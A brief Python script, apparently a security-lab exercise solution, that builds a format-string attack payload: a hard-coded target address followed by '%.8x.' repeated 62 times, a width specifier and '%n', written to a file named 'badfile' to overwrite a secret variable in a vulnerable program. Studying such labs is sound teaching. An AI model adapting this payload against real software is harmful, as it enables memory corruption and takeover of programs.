#!/usr/bin/python3

import sys

N = 1500

# Initialize payload with 1500 bytes
content = bytearray(0x0 for _ in range(N))

# Address of the secret message
target_variable_addr = 0x080ee068
content[0:4]  =  (target_variable_addr).to_bytes(4,byteorder='little')

# This line shows how to construct a string s with
s = "%.8x."*62 +"%.19918x" +"%n"

# The line shows how to store the string s at offset 4
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write payload to badfile
with open('badfile', 'wb') as f:
    f.write(content)

# Output payload for testing
sys.stdout.buffer.write(content)
